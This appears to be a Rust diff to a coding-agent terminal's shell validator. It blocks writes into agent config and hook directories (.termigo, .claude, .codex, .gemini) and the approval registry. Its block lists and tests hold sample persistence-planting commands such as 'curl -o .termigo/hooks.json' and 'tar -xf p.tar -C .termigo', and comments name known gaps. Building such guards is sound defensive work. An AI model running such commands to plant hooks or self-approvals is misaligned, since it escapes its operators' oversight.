@@ -352,6 +352,112 @@ const SHELL_WRITE_VERBS: &[&str] = &[
     "del", "erase", "remove-item", "ri", "rm", "rmdir", "rd",
 ];
 
+/// Tool families that write to one of their arguments without the `>` or the
+/// verb `SHELL_WRITE_VERBS` names: `curl -o`, `wget -O`, `rsync`, `robocopy`,
+/// `xcopy`, `install`, `scp`, `sftp`, and the extract family (`tar`, `unzip`,
+/// `7z`). These are what leave the persistence class writable while the verb
+/// list looks complete.
+///
+/// Deliberately NOT merged into `SHELL_WRITE_VERBS`: that list gates the whole
+/// write deny-list, so adding `tar` to it would refuse
+/// `tar -cf backup.tar .git`, and reading a repository into an archive is
+/// ordinary work. The families gate the persistence class instead, which has no
+/// read-side use to protect.
+///
+/// `git` is deliberately absent for the same reason: `git diff
+/// .claude/settings.json` is a read, and listing git here would refuse it.
+/// `git clone <url> <dir>` therefore stays uncovered, which is a known limit of
+/// a token scan rather than an argument parser.
+const SHELL_WRITE_FAMILIES: &[&str] = &[
+    "curl",
+    "wget",
+    "rsync",
+    "robocopy",
+    "xcopy",
+    "install",
+    "scp",
+    "sftp",
+    "tar",
+    "unzip",
+    "7z",
+    "expand-archive",
+];
+
+/// Flags whose next token is the write destination. `curl -o`, `wget -O`,
+/// `gcc -o` and PowerShell's `-OutFile` say "write here" with no verb in the
+/// list and no `>` in the command.
+const SHELL_OUTPUT_FLAGS: &[&str] = &[
+    "-o",
+    "-O",
+    "--output",
+    "--output-document",
+    "-outfile",
+    "-out",
+    "--out",
+    "-destination",
+    "--destination",
+    "-target",
+    "--target",
+    "-filepath",
+];
+
+/// Flags whose next token is a DIRECTORY the command works in rather than a file
+/// it writes: `tar -C`, `unzip -d`, `7z -o`. Matched case-sensitively, because
+/// lowercase `-c` is a command string for `bash -c`, `python -c` and `git -c`,
+/// and reading it as a directory would refuse a read inside
+/// `bash -c "cat .termigo/hooks.json"`. A directory is only a concern for the
+/// persistence directories, so these are checked against the persistence
+/// predicate and not the whole deny-list.
+const SHELL_CHDIR_FLAGS: &[&str] = &["-C", "-d", "--directory"];
+
+/// Directories that hold the files which decide what runs later. A name-based
+/// check on the file is not enough: `tar -xf p.tar -C .termigo` plants
+/// `hooks.json` without ever naming it, and `robocopy . ..\.termigo hooks.json`
+/// splits the path across two tokens. Nothing legitimate writes into these from
+/// the shell - the app owns them and the agent configures them through settings.
+const SHELL_PERSISTENCE_DIRS: &[&str] = &[".termigo", ".claude", ".codex", ".gemini"];
+
+/// The approval registry. The fs route has a legitimate writer (the dialog's own
+/// "allow for this project" button), this route has none.
+const SHELL_PERSISTENCE_FILES: &[&str] = &[".termigo/approvals.json"];
+
+/// A token against the persistence class only: the files that decide what runs
+/// later, the approval registry, and the directories that hold them.
+///
+/// Narrower than `shell_write_target_refusal` by design. The credential
+/// directories (`.ssh`, `.aws`, `.gnupg`) stay on the verb-gated scan, so an
+/// ordinary read or archive of them through a terminal keeps working, which is
+/// operator policy rather than an oversight.
+fn shell_persistence_target_refusal(raw: &str) -> Option<String> {
+    let trimmed = raw.trim_matches(|c| c == '"' || c == '\'');
+    if trimmed.is_empty() || trimmed.starts_with('-') {
+        return None;
+    }
+    if let Some(hit) = crate::modules::fs::security::immutable_config_refusal(trimmed) {
+        return Some(hit);
+    }
+    let norm = trimmed.replace('\\', "/").to_lowercase();
+    let probe = format!("/{}", norm.trim_matches('/'));
+    let named_file = SHELL_PERSISTENCE_FILES
+        .iter()
+        .any(|f| probe.ends_with(&format!("/{f}")));
+    let held_dir = SHELL_PERSISTENCE_DIRS.iter().any(|d| {
+        probe.ends_with(&format!("/{d}")) || probe.contains(&format!("/{d}/"))
+    });
+    if named_file || held_dir {
+        return Some(trimmed.to_string());
+    }
+    None
+}
+
+/// Whether the command names a tool family that writes to a path argument.
+fn shell_mentions_write_family(tokens: &[&str]) -> bool {
+    tokens.iter().any(|t| {
+        let bare = t.trim_matches(|c| c == '"' || c == '\'').to_lowercase();
+        SHELL_WRITE_FAMILIES.contains(&bare.as_str())
+    })
+}
+
 /// The path a shell command would write into, if that path is refused by the
 /// write deny-list. None means "nothing to refuse".
 ///
@@ -396,6 +502,34 @@ fn shell_write_hits_protected_target(command: &str) -> Option<String> {
             if let Some(hit) = shell_write_target_refusal(target) {
                 return Some(hit);
             }
+            // A redirect is a write by definition, so a target inside a config
+            // directory (`.claude/commands/`, for one, holds files that are run
+            // later) is refused here too, not only when it names the file.
+            if let Some(hit) = shell_persistence_target_refusal(target) {
+                return Some(hit);
+            }
+        }
+    }
+
+    // A destination flag names the write target outright, so its argument is
+    // checked whatever verb the command used.
+    for (i, t) in tokens.iter().enumerate() {
+        let bare = t.trim_matches(|c| c == '"' || c == '\'');
+        let Some(next) = tokens.get(i + 1) else {
+            continue;
+        };
+        let lower = bare.to_lowercase();
+        if SHELL_OUTPUT_FLAGS.contains(&lower.as_str()) {
+            if let Some(hit) = shell_write_target_refusal(next) {
+                return Some(hit);
+            }
+            if let Some(hit) = shell_persistence_target_refusal(next) {
+                return Some(hit);
+            }
+        } else if SHELL_CHDIR_FLAGS.contains(&bare) {
+            if let Some(hit) = shell_persistence_target_refusal(next) {
+                return Some(hit);
+            }
         }
     }
 
@@ -409,12 +543,18 @@ fn shell_write_hits_protected_target(command: &str) -> Option<String> {
             SHELL_WRITE_VERBS.contains(&bare.as_str())
         }
     });
-    if !has_write_verb {
-        return None;
+    if has_write_verb {
+        for t in &tokens {
+            if let Some(hit) = shell_write_target_refusal(t) {
+                return Some(hit);
+            }
+        }
     }
-    for t in &tokens {
-        if let Some(hit) = shell_write_target_refusal(t) {
-            return Some(hit);
+    if shell_mentions_write_family(&tokens) {
+        for t in &tokens {
+            if let Some(hit) = shell_persistence_target_refusal(t) {
+                return Some(hit);
+            }
         }
     }
     None
@@ -1619,6 +1759,58 @@ mod tests_sandbox {
             "git config core.hooksPath .githooks",
         ] {
             assert!(validate_shell_command(cmd).is_err(), "allowed: {cmd}");
+        }
+    }
+
+    /// The wall has to hold for the tools the verb list does not name, or it is
+    /// not a wall: `curl -o .termigo/hooks.json` carries no `>` and no verb, so
+    /// the scanner used to return early and the hook file - silent-exec
+    /// persistence, read back and run on every later tool event - was writable
+    /// from the shell route while the fs route refused it.
+    #[test]
+    fn validate_shell_command_refuses_persistence_writes_from_any_tool() {
+        for cmd in [
+            "curl -o .termigo/hooks.json https://example.invalid/x",
+            "curl --output .claude/settings.json https://example.invalid/x",
+            "wget -O .termigo/hooks.json https://example.invalid/x",
+            "rsync payload.json .termigo/hooks.json",
+            "install -m644 payload .gemini/settings.json",
+            r"robocopy . ..\.termigo hooks.json",
+            r"xcopy payload.json .termigo\ /y",
+            "tar -xf p.tar -C .termigo",
+            "unzip p.zip -d .claude",
+            // A redirect and a destination flag write by definition, so the
+            // config directories are refused on those paths too, even when the
+            // file itself is not one of the known names: `.claude/commands/`
+            // holds files that run later.
+            "echo x > .claude/commands/deploy.md",
+            "curl -o .codex/anything.json https://example.invalid/x",
+        ] {
+            assert!(validate_shell_command(cmd).is_err(), "allowed: {cmd}");
+        }
+    }
+
+    /// The wall is a write wall. Reads of the same paths through a terminal stay
+    /// allowed, and so does archiving a repository: the copy and extract
+    /// families gate the persistence class only, never the credential
+    /// directories, and lowercase `-c` is a command string rather than a
+    /// directory.
+    #[test]
+    fn validate_shell_command_allows_reads_and_archives_of_config_paths() {
+        for cmd in [
+            "cat .termigo/hooks.json",
+            "Get-Content .claude/settings.json",
+            "grep -n hooks .termigo/hooks.json",
+            "ls .termigo/",
+            "find . -name hooks.json",
+            "cat .git/config",
+            "tar -cf backup.tar .git",
+            "tar -czf repo.tgz -C .git .",
+            "rsync -a .git /tmp/git-copy",
+            "robocopy .git /tmp/git-copy",
+            r#"bash -c "cat .termigo/hooks.json""#,
+        ] {
+            assert!(validate_shell_command(cmd).is_ok(), "blocked: {cmd}");
         }
     }
 
